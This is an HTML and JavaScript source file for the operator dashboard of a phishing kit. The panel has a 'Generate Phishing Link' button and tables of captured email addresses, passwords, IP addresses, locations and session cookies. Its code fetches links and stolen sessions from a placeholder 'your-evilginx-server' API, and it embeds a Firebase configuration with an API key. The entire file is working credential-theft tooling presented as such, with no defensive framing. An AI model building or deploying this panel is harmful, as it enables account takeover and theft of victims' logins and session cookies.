<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .hidden { display: none; }
    </style>
</head>
<body class="h-screen flex">
    <aside class="w-64 bg-gray-900 p-6">
        <h2 class="text-xl font-bold mb-6">Dashboard</h2>
        <nav>
            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="generate-link">Generate Link</button>
            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="captured-sessions">Captured Sessions</button>
            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="cookies">Cookies</button>
            <button onclick="logout()" class="block w-full p-3 bg-red-600 rounded">Logout</button>
        </nav>
    </aside>

    <main class="flex-grow p-6">
        <section id="generate-link" class="hidden">
            <h2 class="text-2xl mb-4">Generate Phishing Link</h2>
            <button onclick="generateLink()" class="bg-green-500 text-white px-4 py-2 rounded">Generate Link</button>
            <p id="generated-link" class="mt-4"></p>
        </section>

        <section id="captured-sessions" class="hidden">
            <h2 class="text-2xl mb-4">Captured Sessions</h2>
            <table class="w-full bg-white text-black rounded">
                <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Location</th><th>Timestamp</th></tr></thead>
                <tbody id="session-data"></tbody>
            </table>
        </section>

        <section id="cookies" class="hidden">
            <h2 class="text-2xl mb-4">Captured Cookies</h2>
            <table class="w-full bg-white text-black rounded">
                <thead><tr><th>Session ID</th><th>Cookie Data</th></tr></thead>
                <tbody id="cookies-data"></tbody>
            </table>
        </section>
    </main>

    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
            authDomain: "panel-auth-134b7.firebaseapp.com",
            projectId: "panel-auth-134b7",
            storageBucket: "panel-auth-134b7.firebasestorage.app",
            messagingSenderId: "892746068340",
            appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
        });

        const auth = firebase.auth();
        auth.onAuthStateChanged(user => {
            if (!user) window.location.href = 'index.html';
        });

        function logout() {
            auth.signOut().then(() => window.location.href = 'index.html');
        }

        document.querySelectorAll('.menu-btn').forEach(button => {
            button.addEventListener('click', () => {
                document.querySelectorAll('section').forEach(section => section.classList.add('hidden'));
                document.getElementById(button.dataset.section).classList.remove('hidden');
            });
        });

        async function generateLink() {
            try {
                let response = await fetch('https://your-evilginx-server/api/generate', { method: 'POST' });
                let data = await response.json();
                document.getElementById('generated-link').innerText = data.link;
            } catch (error) {
                console.error('Error generating link:', error);
            }
        }

        async function loadCapturedSessions() {
            let response = await fetch('https://your-evilginx-server/api/sessions');
            let sessions = await response.json();
            document.getElementById('session-data').innerHTML = sessions.map(s => `<tr><td>${s.email}</td><td>${s.password}</td><td>${s.ip}</td><td>${s.location}</td><td>${s.timestamp}</td></tr>`).join('');
        }

        document.querySelector('[data-section="captured-sessions"]').addEventListener('click', loadCapturedSessions);
    </script>
</body>
</html>
